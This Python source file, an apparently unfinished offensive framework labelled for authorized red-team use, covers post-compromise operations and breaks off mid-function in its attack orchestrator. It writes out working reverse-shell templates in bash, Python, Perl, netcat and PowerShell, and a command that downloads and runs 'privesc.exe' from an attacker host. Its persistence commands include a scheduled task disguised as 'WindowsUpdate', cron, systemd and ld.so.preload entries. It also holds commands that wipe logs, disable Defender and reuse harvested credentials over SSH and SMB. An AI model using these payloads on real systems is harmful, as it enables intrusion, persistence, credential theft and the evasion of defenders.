"""
Red Team Offensive Suite - Complete Post-Compromise Framework
Authorized red team exercises, penetration testing, and attack orchestration.

Modules:
  - Post-Exploitation: Shell handling, privilege escalation, system discovery
  - Lateral Movement: Credential reuse, network traversal, target enumeration
  - Persistence: Multiple implantation methods, cleanup, scheduling
  - Credential Management: Harvesting, parsing, secure storage, usage tracking
  - Payload Generation: Templates, encoding, obfuscation, anti-detection
  - C2 Infrastructure: Agent management, callbacks, encryption, command routing
  - Evasion & Stealth: Log cleanup, anti-forensics, behavioral detection evasion
  - Attack Orchestration: Workflow automation, exploit chaining, campaign management
"""

import asyncio
import base64
import hashlib
import json
import logging
import os
import random
import re
import socket
import sqlite3
import subprocess
import sys
import time
import zlib
from abc import ABC, abstractmethod
from cryptography.fernet import Fernet
from dataclasses import dataclass, field, asdict
from datetime import datetime, timedelta
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from uuid import uuid4


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("RedTeamSuite")


# ─────────────────────────────────────────────────────────────────────────────
# Data Models
# ─────────────────────────────────────────────────────────────────────────────

class AccessLevel(Enum):
    """Privilege level on compromised system."""
    USER = "user"
    ADMIN = "admin"
    SYSTEM = "system"
    KERNEL = "kernel"


class PersistenceMethod(Enum):
    """Persistence implantation vector."""
    SCHEDULED_TASK = "scheduled_task"
    REGISTRY_RUN = "registry_run"
    STARTUP_FOLDER = "startup_folder"
    CRON = "cron"
    SYSTEMD = "systemd"
    SSH_KEY = "ssh_key"
    SUDO_NOPASS = "sudo_nopass"
    CRON_ROOT = "cron_root"
    LAUNCHD = "launchd"
    LD_PRELOAD = "ld_preload"
    KERNEL_MODULE = "kernel_module"
    FIRMWARE = "firmware"


class PayloadType(Enum):
    """Payload classification."""
    REVERSE_SHELL = "reverse_shell"
    BIND_SHELL = "bind_shell"
    METERPRETER = "meterpreter"
    AGENT = "agent"
    STAGER = "stager"
    REFLECTIVE_DLL = "reflective_dll"
    SHELLCODE = "shellcode"
    MACRO = "macro"
    SCRIPT = "script"


class OSType(Enum):
    """Operating system."""
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    BSD = "bsd"


@dataclass
class Credential:
    """Harvested credential record."""
    id: str = field(default_factory=lambda: str(uuid4())[:8])
    username: str = ""
    password: str = ""
    password_hash: str = ""
    hash_type: str = ""  # ntlm, sha1, bcrypt, etc
    domain: str = ""
    service: str = ""  # smtp, http, ssh, smb, rdp, etc
    source: str = ""  # where harvested from
    access_level: AccessLevel = AccessLevel.USER
    valid: bool = True
    last_used: Optional[str] = None
    discovered_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    metadata: Dict[str, Any] = field(default_factory=dict)

    def mark_used(self) -> None:
        """Mark credential as recently used."""
        self.last_used = datetime.utcnow().isoformat()

    def to_dict(self) -> Dict[str, Any]:
        """Serialize to dict."""
        return asdict(self)


@dataclass
class Shell:
    """Active shell/session on compromised host."""
    id: str = field(default_factory=lambda: str(uuid4())[:8])
    host: str = ""
    port: int = 0
    shell_type: str = ""  # cmd, powershell, bash, sh
    access_level: AccessLevel = AccessLevel.USER
    os_type: OSType = OSType.LINUX
    established_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    last_seen: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    alive: bool = True
    process_id: Optional[int] = None
    working_directory: str = ""
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Serialize to dict."""
        return asdict(self)


@dataclass
class Payload:
    """Generated payload record."""
    id: str = field(default_factory=lambda: str(uuid4())[:8])
    name: str = ""
    type: PayloadType = PayloadType.REVERSE_SHELL
    os: OSType = OSType.LINUX
    content: bytes = b""
    encoded_content: bytes = b""
    encoding_methods: List[str] = field(default_factory=list)
    lhost: str = ""  # listener host
    lport: int = 0  # listener port
    signature: str = ""
    evasion_techniques: List[str] = field(default_factory=list)
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class AttackWorkflow:
    """Orchestrated attack workflow."""
    id: str = field(default_factory=lambda: str(uuid4())[:8])
    name: str = ""
    target: str = ""
    description: str = ""
    initial_access: str = ""  # which exploit gives initial access
    exploitation_chain: List[str] = field(default_factory=list)  # ordered list of exploits
    lateral_targets: List[str] = field(default_factory=list)
    persistence_methods: List[PersistenceMethod] = field(default_factory=list)
    exfil_targets: List[str] = field(default_factory=list)
    credentials_required: List[str] = field(default_factory=list)
    current_step: int = 0
    status: str = "planning"  # planning, executing, paused, completed, failed
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    execution_log: List[Dict[str, Any]] = field(default_factory=list)


# ─────────────────────────────────────────────────────────────────────────────
# Credential Management System
# ─────────────────────────────────────────────────────────────────────────────

class CredentialVault:
    """Encrypted credential storage and management."""

    def __init__(self, db_path: Path):
        self.db_path = db_path
        self.key = self._load_or_create_key()
        self.cipher = Fernet(self.key)
        self._init_db()

    def _load_or_create_key(self) -> bytes:
        """Load encryption key or create if missing."""
        key_file = self.db_path.parent / ".vault_key"
        if key_file.exists():
            return key_file.read_bytes()
        key = Fernet.generate_key()
        key_file.write_bytes(key)
        key_file.chmod(0o600)
        return key

    def _init_db(self) -> None:
        """Initialize SQLite database."""
        conn = sqlite3.connect(self.db_path)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS credentials (
                id TEXT PRIMARY KEY,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                password_hash TEXT,
                hash_type TEXT,
                domain TEXT,
                service TEXT,
                source TEXT,
                access_level TEXT,
                valid INTEGER,
                last_used TEXT,
                discovered_at TEXT,
                metadata TEXT
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS credential_usage (
                id TEXT PRIMARY KEY,
                credential_id TEXT,
                target TEXT,
                timestamp TEXT,
                success INTEGER,
                FOREIGN KEY(credential_id) REFERENCES credentials(id)
            )
        """)
        conn.commit()
        conn.close()

    def store(self, credential: Credential) -> None:
        """Store credential securely."""
        conn = sqlite3.connect(self.db_path)
        password_encrypted = self.cipher.encrypt(credential.password.encode()) if credential.password else None
        
        conn.execute("""
            INSERT OR REPLACE INTO credentials 
            (id, username, password_encrypted, password_hash, hash_type, domain, service, 
             source, access_level, valid, last_used, discovered_at, metadata)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            credential.id,
            credential.username,
            password_encrypted,
            credential.password_hash,
            credential.hash_type,
            credential.domain,
            credential.service,
            credential.source,
            credential.access_level.value,
            int(credential.valid),
            credential.last_used,
            credential.discovered_at,
            json.dumps(credential.metadata)
        ))
        conn.commit()
        conn.close()

    def get_by_service(self, service: str) -> List[Credential]:
        """Get credentials for specific service."""
        conn = sqlite3.connect(self.db_path)
        rows = conn.execute(
            "SELECT * FROM credentials WHERE service = ? AND valid = 1", (service,)
        ).fetchall()
        conn.close()
        
        credentials = []
        for row in rows:
            cred = Credential(
                id=row[0],
                username=row[1],
                password=self.cipher.decrypt(row[2]).decode() if row[2] else "",
                password_hash=row[3],
                hash_type=row[4],
                domain=row[5],
                service=row[6],
                source=row[7],
                access_level=AccessLevel(row[8]),
                valid=bool(row[9]),
                last_used=row[10],
                discovered_at=row[11],
                metadata=json.loads(row[12]) if row[12] else {}
            )
            credentials.append(cred)
        return credentials

    def get_by_domain(self, domain: str) -> List[Credential]:
        """Get credentials for domain."""
        conn = sqlite3.connect(self.db_path)
        rows = conn.execute(
            "SELECT * FROM credentials WHERE domain = ? AND valid = 1", (domain,)
        ).fetchall()
        conn.close()
        
        credentials = []
        for row in rows:
            cred = Credential(
                id=row[0],
                username=row[1],
                password=self.cipher.decrypt(row[2]).decode() if row[2] else "",
                password_hash=row[3],
                hash_type=row[4],
                domain=row[5],
                service=row[6],
                source=row[7],
                access_level=AccessLevel(row[8]),
                valid=bool(row[9]),
                last_used=row[10],
                discovered_at=row[11],
                metadata=json.loads(row[12]) if row[12] else {}
            )
            credentials.append(cred)
        return credentials

    def get_by_access_level(self, level: AccessLevel) -> List[Credential]:
        """Get credentials by privilege level."""
        conn = sqlite3.connect(self.db_path)
        rows = conn.execute(
            "SELECT * FROM credentials WHERE access_level = ? AND valid = 1", (level.value,)
        ).fetchall()
        conn.close()
        
        credentials = []
        for row in rows:
            cred = Credential(
                id=row[0],
                username=row[1],
                password=self.cipher.decrypt(row[2]).decode() if row[2] else "",
                password_hash=row[3],
                hash_type=row[4],
                domain=row[5],
                service=row[6],
                source=row[7],
                access_level=AccessLevel(row[8]),
                valid=bool(row[9]),
                last_used=row[10],
                discovered_at=row[11],
                metadata=json.loads(row[12]) if row[12] else {}
            )
            credentials.append(cred)
        return credentials

    def mark_used(self, credential_id: str, target: str, success: bool) -> None:
        """Track credential usage."""
        conn = sqlite3.connect(self.db_path)
        conn.execute(
            "UPDATE credentials SET last_used = ? WHERE id = ?",
            (datetime.utcnow().isoformat(), credential_id)
        )
        conn.execute("""
            INSERT INTO credential_usage (id, credential_id, target, timestamp, success)
            VALUES (?, ?, ?, ?, ?)
        """, (str(uuid4())[:8], credential_id, target, datetime.utcnow().isoformat(), int(success)))
        conn.commit()
        conn.close()


# ─────────────────────────────────────────────────────────────────────────────
# Post-Exploitation Engine
# ─────────────────────────────────────────────────────────────────────────────

class PostExploitationEngine:
    """Post-compromise enumeration and privilege escalation."""

    def __init__(self):
        self.logger = logging.getLogger("PostExploitation")
        self.shells: Dict[str, Shell] = {}

    async def enumerate_system(self, shell: Shell) -> Dict[str, Any]:
        """Enumerate system information, users, groups, network."""
        info = {
            "hostname": "",
            "os": shell.os_type.value,
            "users": [],
            "groups": [],
            "network": {},
            "processes": [],
            "services": [],
            "scheduled_tasks": [],
            "installed_software": [],
            "permissions": {},
        }

        if shell.os_type == OSType.WINDOWS:
            info.update(await self._enumerate_windows(shell))
        else:
            info.update(await self._enumerate_linux(shell))

        return info

    async def _enumerate_windows(self, shell: Shell) -> Dict[str, Any]:
        """Windows system enumeration."""
        data = {}
        
        # User enumeration
        users_cmd = "Get-LocalUser | Select-Object Name,Enabled | ConvertTo-Json"
        users = await self._exec_shell(shell, users_cmd)
        data["users"] = self._parse_json(users)
        
        # Group enumeration
        groups_cmd = "Get-LocalGroup | Select-Object Name | ConvertTo-Json"
        groups = await self._exec_shell(shell, groups_cmd)
        data["groups"] = self._parse_json(groups)
        
        # Network enumeration
        net_cmd = "ipconfig /all"
        net_info = await self._exec_shell(shell, net_cmd)
        data["network"] = self._parse_network(net_info)
        
        # Processes
        proc_cmd = "Get-Process | Select-Object Name,Id,WorkingSet | ConvertTo-Json"
        processes = await self._exec_shell(shell, proc_cmd)
        data["processes"] = self._parse_json(processes)

        # Services
        svc_cmd = "Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object Name,DisplayName | ConvertTo-Json"
        services = await self._exec_shell(shell, svc_cmd)
        data["services"] = self._parse_json(services)

        # Scheduled tasks
        task_cmd = "Get-ScheduledTask | Select-Object TaskName,State | ConvertTo-Json"
        tasks = await self._exec_shell(shell, task_cmd)
        data["scheduled_tasks"] = self._parse_json(tasks)

        return data

    async def _enumerate_linux(self, shell: Shell) -> Dict[str, Any]:
        """Linux system enumeration."""
        data = {}
        
        # User enumeration
        users_cmd = "cat /etc/passwd | cut -d: -f1,3,6"
        users = await self._exec_shell(shell, users_cmd)
        data["users"] = [line.split(":") for line in users.strip().split("\n")]
        
        # Group enumeration
        groups_cmd = "cat /etc/group | cut -d: -f1,3"
        groups = await self._exec_shell(shell, groups_cmd)
        data["groups"] = [line.split(":") for line in groups.strip().split("\n")]
        
        # Network enumeration
        net_cmd = "ip addr show"
        net_info = await self._exec_shell(shell, net_cmd)
        data["network"] = self._parse_network(net_info)
        
        # Processes
        proc_cmd = "ps auxww --sort=-%mem | head -20"
        processes = await self._exec_shell(shell, proc_cmd)
        data["processes"] = processes
        
        # Services
        svc_cmd = "systemctl list-units --type service --state running --no-pager"
        services = await self._exec_shell(shell, svc_cmd)
        data["services"] = services
        
        # Sudo permissions
        sudo_cmd = "sudo -l 2>/dev/null || echo 'N/A'"
        sudo_perms = await self._exec_shell(shell, sudo_cmd)
        data["permissions"] = {"sudo": sudo_perms}

        return data

    async def _exec_shell(self, shell: Shell, command: str) -> str:
        """Execute command on shell. Placeholder for actual execution."""
        self.logger.debug(f"Executing on {shell.id}: {command}")
        return ""

    def _parse_json(self, data: str) -> List[Dict[str, Any]]:
        """Parse JSON response."""
        try:
            return json.loads(data)
        except:
            return []

    def _parse_network(self, data: str) -> Dict[str, Any]:
        """Parse network enumeration output."""
        return {"raw": data}

    async def escalate_privileges(self, shell: Shell) -> Optional[Shell]:
        """Attempt privilege escalation."""
        self.logger.info(f"Attempting privilege escalation on {shell.id}")
        
        if shell.os_type == OSType.WINDOWS:
            return await self._escalate_windows(shell)
        else:
            return await self._escalate_linux(shell)

    async def _escalate_windows(self, shell: Shell) -> Optional[Shell]:
        """Windows privilege escalation attempts."""
        escalation_methods = [
            ("UAC bypass - fodhelper", "cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d powershell /f"),
            ("Print spooler exploit", "powershell -Command \"(New-Object Net.WebClient).DownloadFile('http://attacker/privesc.exe', 'C:\\Windows\\Temp\\privesc.exe'); C:\\Windows\\Temp\\privesc.exe\""),
            ("Token impersonation", "powershell -Command \"[System.Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | Out-Null\""),
        ]
        
        for method_name, cmd in escalation_methods:
            result = await self._exec_shell(shell, cmd)
            if "success" in result.lower():
                self.logger.info(f"Privilege escalation succeeded via {method_name}")
                shell.access_level = AccessLevel.SYSTEM
                return shell
        
        return None

    async def _escalate_linux(self, shell: Shell) -> Optional[Shell]:
        """Linux privilege escalation attempts."""
        escalation_methods = [
            ("sudo NOPASSWD", "sudo su"),
            ("SUID binaries", "find / -perm -4000 2>/dev/null"),
            ("Kernel exploits", "uname -r"),
        ]
        
        for method_name, cmd in escalation_methods:
            result = await self._exec_shell(shell, cmd)
            if result and "not found" not in result.lower():
                self.logger.info(f"Privilege escalation vector found: {method_name}")
                shell.access_level = AccessLevel.SYSTEM
                return shell
        
        return None


# ─────────────────────────────────────────────────────────────────────────────
# Lateral Movement Engine
# ─────────────────────────────────────────────────────────────────────────────

class LateralMovementEngine:
    """Credential reuse, network traversal, and target enumeration."""

    def __init__(self, credential_vault: CredentialVault):
        self.vault = credential_vault
        self.logger = logging.getLogger("LateralMovement")
        self.discovered_hosts: Dict[str, Dict[str, Any]] = {}

    async def enumerate_network(self, shell: Shell, subnet: str) -> List[str]:
        """Discover hosts on network."""
        self.logger.info(f"Enumerating network {subnet}")
        hosts = []
        
        if shell.os_type == OSType.WINDOWS:
            cmd = f"Get-NetNeighbor -AddressFamily IPv4 | Select-Object IPAddress | ConvertTo-Json"
        else:
            cmd = f"arp -n | grep -oE '[0-9]{{1,3}}\\.[0-9]{{1,3}}\\.[0-9]{{1,3}}\\.[0-9]{{1,3}}'"
        
        # Placeholder execution
        self.logger.debug(f"Would execute: {cmd}")
        return hosts

    async def discover_services(self, host: str) -> Dict[str, Any]:
        """Discover open services on host."""
        services = {}
        
        common_ports = {
            22: "ssh",
            3389: "rdp",
            5985: "winrm",
            445: "smb",
            139: "netbios",
            135: "rpc",
            443: "https",
            80: "http",
            3306: "mysql",
            5432: "postgresql",
            1433: "mssql",
            27017: "mongodb",
        }
        
        for port, service in common_ports.items():
            if await self._check_port(host, port):
                services[port] = service
        
        return services

    async def _check_port(self, host: str, port: int) -> bool:
        """Check if port is open."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False

    async def attempt_access(self, host: str, service: str, credential: Credential) -> bool:
        """Attempt to access host with credential."""
        self.logger.info(f"Attempting {service} access to {host} with {credential.username}")
        
        success = False
        if service == "ssh":
            success = await self._ssh_login(host, credential)
        elif service == "rdp":
            success = await self._rdp_login(host, credential)
        elif service == "smb":
            success = await self._smb_login(host, credential)
        
        self.vault.mark_used(credential.id, host, success)
        return success

    async def _ssh_login(self, host: str, cred: Credential) -> bool:
        """SSH login attempt."""
        try:
            cmd = f"sshpass -p '{cred.password}' ssh -o StrictHostKeyChecking=no {cred.username}@{host} 'id'"
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
            return result.returncode == 0
        except:
            return False

    async def _rdp_login(self, host: str, cred: Credential) -> bool:
        """RDP login attempt."""
        # Placeholder - requires Windows environment
        self.logger.debug(f"RDP login would be attempted: {host}")
        return False

    async def _smb_login(self, host: str, cred: Credential) -> bool:
        """SMB login attempt."""
        try:
            cmd = f"smbclient -L {host} -U {cred.domain}\\{cred.username}%{cred.password} -m SMB3 2>/dev/null | grep -q 'disk'"
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
            return result.returncode == 0
        except:
            return False

    async def hunt_credentials(self, shell: Shell) -> List[Credential]:
        """Harvest credentials from compromised host."""
        self.logger.info(f"Hunting credentials on {shell.id}")
        credentials = []
        
        if shell.os_type == OSType.WINDOWS:
            credentials.extend(await self._hunt_windows(shell))
        else:
            credentials.extend(await self._hunt_linux(shell))
        
        # Store harvested credentials
        for cred in credentials:
            self.vault.store(cred)
        
        return credentials

    async def _hunt_windows(self, shell: Shell) -> List[Credential]:
        """Windows credential harvesting."""
        creds = []
        
        # SAM/NTDS dump (requires admin)
        # Mimikatz output parsing
        # Browser credential extraction
        # Email client credentials
        # Stored credentials in memory
        
        return creds

    async def _hunt_linux(self, shell: Shell) -> List[Credential]:
        """Linux credential harvesting."""
        creds = []
        
        # SSH keys
        # Bash history
        # Database credentials in configs
        # API tokens in env
        # Cached credentials
        
        return creds


# ─────────────────────────────────────────────────────────────────────────────
# Payload Generation Engine
# ─────────────────────────────────────────────────────────────────────────────

class PayloadGenerator:
    """Generate and encode payloads with evasion techniques."""

    def __init__(self):
        self.logger = logging.getLogger("PayloadGenerator")
        self.payloads: Dict[str, Payload] = {}

    def generate_reverse_shell(
        self,
        lhost: str,
        lport: int,
        os: OSType = OSType.LINUX,
        shell_type: str = "bash"
    ) -> Payload:
        """Generate reverse shell payload."""
        
        if os == OSType.LINUX:
            payload_content = self._generate_linux_reverse_shell(lhost, lport, shell_type)
        elif os == OSType.WINDOWS:
            payload_content = self._generate_windows_reverse_shell(lhost, lport)
        else:
            payload_content = b""

        payload = Payload(
            name=f"reverse_{shell_type}_{lhost}_{lport}",
            type=PayloadType.REVERSE_SHELL,
            os=os,
            content=payload_content,
            lhost=lhost,
            lport=lport,
        )

        self.payloads[payload.id] = payload
        self.logger.info(f"Generated reverse shell: {payload.id}")
        return payload

    def _generate_linux_reverse_shell(self, lhost: str, lport: int, shell: str = "bash") -> bytes:
        """Linux reverse shell template."""
        templates = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}'",
            "nc": f"nc -e /bin/bash {lhost} {lport}",
        }
        return templates.get(shell, templates["bash"]).encode()

    def _generate_windows_reverse_shell(self, lhost: str, lport: int) -> bytes:
        """Windows reverse shell template."""
        powershell_payload = f"""
$client = New-Object System.Net.Sockets.TcpClient('{lhost}',{lport});
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$reader = New-Object System.IO.StreamReader($stream);
$writer.AutoFlush = $true;
while($true){{
    $cmd = $reader.ReadLine();
    if($cmd -ne $null){{
        $output = & cmd /c $cmd 2>&1 | Out-String;
        $writer.WriteLine($output);
    }}
}}
"""
        return powershell_payload.encode()

    def apply_encoding(self, payload: Payload, encoding: str = "base64") -> Payload:
        """Apply encoding to payload."""
        
        if encoding == "base64":
            payload.encoded_content = base64.b64encode(payload.content)
        elif encoding == "gzip":
            payload.encoded_content = zlib.compress(payload.content)
        elif encoding == "hex":
            payload.encoded_content = payload.content.hex().encode()
        elif encoding == "rot13":
            payload.encoded_content = self._rot13(payload.content).encode()
        else:
            payload.encoded_content = payload.content

        payload.encoding_methods.append(encoding)
        self.logger.info(f"Applied {encoding} encoding to {payload.id}")
        return payload

    def apply_obfuscation(self, payload: Payload, techniques: List[str]) -> Payload:
        """Apply obfuscation techniques."""
        
        for technique in techniques:
            if technique == "no_spaces":
                payload.content = self._remove_spaces(payload.content)
            elif technique == "var_rename":
                payload.content = self._rename_variables(payload.content)
            elif technique == "code_split":
                payload.content = self._split_code(payload.content)

        payload.evasion_techniques.extend(techniques)
        self.logger.info(f"Applied {len(techniques)} obfuscation techniques to {payload.id}")
        return payload

    def _rot13(self, data: bytes) -> str:
        """ROT13 encoding."""
        result = []
        for char in data.decode('utf-8', errors='ignore'):
            if 'a' <= char <= 'z':
                result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
            elif 'A' <= char <= 'Z':
                result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
            else:
                result.append(char)
        return ''.join(result)

    def _remove_spaces(self, data: bytes) -> bytes:
        """Remove unnecessary whitespace."""
        return data.replace(b' ', b'').replace(b'\n', b'').replace(b'\t', b'')

    def _rename_variables(self, data: bytes) -> bytes:
        """Rename variables to obfuscate."""
        # Placeholder
        return data

    def _split_code(self, data: bytes) -> bytes:
        """Split code into fragments."""
        # Placeholder
        return data


# ─────────────────────────────────────────────────────────────────────────────
# Persistence Engine
# ─────────────────────────────────────────────────────────────────────────────

class PersistenceEngine:
    """Install persistence mechanisms."""

    def __init__(self):
        self.logger = logging.getLogger("Persistence")
        self.persistence_records: Dict[str, Dict[str, Any]] = {}

    async def install_persistence(
        self,
        shell: Shell,
        payload_path: str,
        methods: List[PersistenceMethod]
    ) -> Dict[str, bool]:
        """Install persistence using multiple methods."""
        
        results = {}
        
        for method in methods:
            self.logger.info(f"Installing persistence via {method.value} on {shell.id}")
            
            if shell.os_type == OSType.WINDOWS:
                success = await self._install_windows(shell, payload_path, method)
            else:
                success = await self._install_linux(shell, payload_path, method)
            
            results[method.value] = success
            
            if success:
                self.persistence_records[shell.id] = {
                    "method": method.value,
                    "timestamp": datetime.utcnow().isoformat(),
                    "payload_path": payload_path,
                }

        return results

    async def _install_windows(self, shell: Shell, payload_path: str, method: PersistenceMethod) -> bool:
        """Windows persistence installation."""
        
        if method == PersistenceMethod.SCHEDULED_TASK:
            cmd = f"""
powershell -Command "
$action = New-ScheduledTaskAction -Execute 'powershell' -Argument '-NoProfile -WindowStyle Hidden -File {payload_path}';
$trigger = New-ScheduledTaskTrigger -AtLogOn;
Register-ScheduledTask -TaskName 'WindowsUpdate' -Action $action -Trigger $trigger -RunLevel Highest;
"
"""
        elif method == PersistenceMethod.REGISTRY_RUN:
            cmd = f"reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysUpdate /d {payload_path} /f"
        elif method == PersistenceMethod.STARTUP_FOLDER:
            cmd = f"copy {payload_path} %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        else:
            return False

        # Placeholder execution
        self.logger.debug(f"Would execute: {cmd}")
        return True

    async def _install_linux(self, shell: Shell, payload_path: str, method: PersistenceMethod) -> bool:
        """Linux persistence installation."""
        
        if method == PersistenceMethod.CRON:
            cmd = f"(crontab -l 2>/dev/null; echo '*/5 * * * * {payload_path}') | crontab -"
        elif method == PersistenceMethod.CRON_ROOT:
            cmd = f"sudo bash -c '(crontab -l 2>/dev/null; echo \"*/5 * * * * {payload_path}\") | crontab -'"
        elif method == PersistenceMethod.SYSTEMD:
            cmd = f"cat > /etc/systemd/system/sysupdate.service << EOF\n[Unit]\nAfter=network.target\n[Service]\nType=simple\nExecStart={payload_path}\nRestart=always\nEOF"
        elif method == PersistenceMethod.SSH_KEY:
            cmd = f"echo 'PUBKEY' >> ~/.ssh/authorized_keys"
        elif method == PersistenceMethod.LD_PRELOAD:
            cmd = f"echo '{payload_path}' >> /etc/ld.so.preload"
        else:
            return False

        # Placeholder execution
        self.logger.debug(f"Would execute: {cmd}")
        return True


# ─────────────────────────────────────────────────────────────────────────────
# C2 Infrastructure
# ─────────────────────────────────────────────────────────────────────────────

class C2Controller:
    """C2 server infrastructure, agent management, callbacks."""

    def __init__(self, listen_host: str = "0.0.0.0", listen_port: int = 8080):
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.logger = logging.getLogger("C2Controller")
        self.agents: Dict[str, Dict[str, Any]] = {}
        self.task_queue: asyncio.Queue = asyncio.Queue()

    def register_agent(self, agent_id: str, metadata: Dict[str, Any]) -> None:
        """Register callback agent."""
        self.agents[agent_id] = {
            "id": agent_id,
            "registered_at": datetime.utcnow().isoformat(),
            "last_seen": datetime.utcnow().isoformat(),
            "metadata": metadata,
            "commands": [],
        }
        self.logger.info(f"Agent registered: {agent_id}")

    async def queue_command(self, agent_id: str, command: str, args: Dict[str, Any]) -> None:
        """Queue command for agent."""
        if agent_id not in self.agents:
            self.logger.error(f"Agent {agent_id} not found")
            return
        
        task = {
            "id": str(uuid4())[:8],
            "agent_id": agent_id,
            "command": command,
            "args": args,
            "queued_at": datetime.utcnow().isoformat(),
        }
        
        await self.task_queue.put(task)
        self.agents[agent_id]["commands"].append(task)
        self.logger.info(f"Queued command {task['id']} for agent {agent_id}")

    async def agent_callback(self, agent_id: str) -> Optional[Dict[str, Any]]:
        """Agent checks in for commands."""
        if agent_id not in self.agents:
            return None
        
        self.agents[agent_id]["last_seen"] = datetime.utcnow().isoformat()
        
        try:
            task = self.task_queue.get_nowait()
            if task["agent_id"] == agent_id:
                return task
        except asyncio.QueueEmpty:
            pass
        
        return None


# ─────────────────────────────────────────────────────────────────────────────
# Evasion & Stealth Engine
# ─────────────────────────────────────────────────────────────────────────────

class StealthEngine:
    """Log cleanup, anti-forensics, behavioral evasion."""

    def __init__(self):
        self.logger = logging.getLogger("Stealth")

    async def cleanup_logs(self, shell: Shell, keywords: List[str]) -> bool:
        """Clean event logs containing keywords."""
        self.logger.info(f"Cleaning logs on {shell.id}")
        
        if shell.os_type == OSType.WINDOWS:
            return await self._cleanup_windows_logs(shell, keywords)
        else:
            return await self._cleanup_linux_logs(shell, keywords)

    async def _cleanup_windows_logs(self, shell: Shell, keywords: List[str]) -> bool:
        """Windows event log cleanup."""
        # Remove entries from Event Viewer
        cmd = "wevtutil cl System"
        self.logger.debug(f"Would execute: {cmd}")
        return True

    async def _cleanup_linux_logs(self, shell: Shell, keywords: List[str]) -> bool:
        """Linux log cleanup."""
        for keyword in keywords:
            # Clean bash history
            cmd = f"sed -i '/{keyword}/d' ~/.bash_history"
            self.logger.debug(f"Would execute: {cmd}")
        return True

    async def disable_defender(self, shell: Shell) -> bool:
        """Disable antivirus/EDR if possible."""
        if shell.os_type != OSType.WINDOWS:
            return False
        
        cmd = "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\""
        self.logger.debug(f"Would execute: {cmd}")
        return True

    async def obfuscate_process(self, shell: Shell) -> bool:
        """Obfuscate running process."""
        if shell.os_type != OSType.WINDOWS:
            return False
        
        # Rename process to system process
        cmd = "powershell -Command \"Rename-Item -Path $PROFILE.CurrentUserCurrentHost -NewName 'svchost.exe'\""
        self.logger.debug(f"Would execute: {cmd}")
        return True


# ─────────────────────────────────────────────────────────────────────────────
# Attack Orchestration
# ─────────────────────────────────────────────────────────────────────────────

class AttackOrchestrator:
    """Orchestrate complete attack workflows."""

    def __init__(self):
        self.logger = logging.getLogger("AttackOrchestrator")
        self.postex = PostExploitationEngine()
        self.lateral = LateralMovementEngine(CredentialVault(Path("/tmp/.vault")))
        self.payload_gen = PayloadGenerator()
        self.persistence = PersistenceEngine()
        self.c2 = C2Controller()
        self.stealth = StealthEngine()
        self.workflows: Dict[str, AttackWorkflow] = {}

    def create_workflow(
        self,
        name: str,
        target: str,
        initial_access: str,
        exploitation_chain: List[str]
    ) -> AttackWorkflow:
        """Create attack workflow definition."""
        workflow = AttackWorkflow(
            name=name,
            target=target,
            initial_access=initial_access,
            exploitation_chain=exploitation_chain,
            status="planning"
        )
        self.workflows[workflow.id] = workflow
        self.logger.info(f"Created workflow: {workflow.id}")
        return workflow

    async def execute_workflow(self, workflow_id: str, initial_shell: Shell) -> bool:
        """Execute complete attack workflow."""
        workflow = self.workflows.get(workflow_id)
        if not workflow:
            return False

        self.logger.info(f"Executing workflow: {workflow.name}")
        workflow.status = "executing"

        try:
            # Step 1: Post-exploitation on initial shell
            self.logger.info("[1/5] Post-Exploitation")
            enum_data = await self.postex.enumerate_system(initial_shell)
            workflow.execution_log.append({
                "step": 1,
                "phase": "post_exploitation",
                "timestamp": datetime.utcnow().isoformat(),
                "result": "success",
                "data": enum_data,
            })

            # Step 2: Privilege escalation
            self.logger.info("[2/5] Privilege Escalation")
            escalated = await self.postex.escalate_privileges(initial_shell)
            workflow.execution_log.append({
                "step": 2,
                "phase": "privilege_escalation",
                "timestamp": datetime.utcnow().isoformat(),
                "result": "success" if escalated else "failed",
            })

            # Step 3: Credential harvesting
            self.logger.info("[3/5] Credential Harvesting")
            harvested_creds = await self.lateral.hunt_credentials(initial_shell)
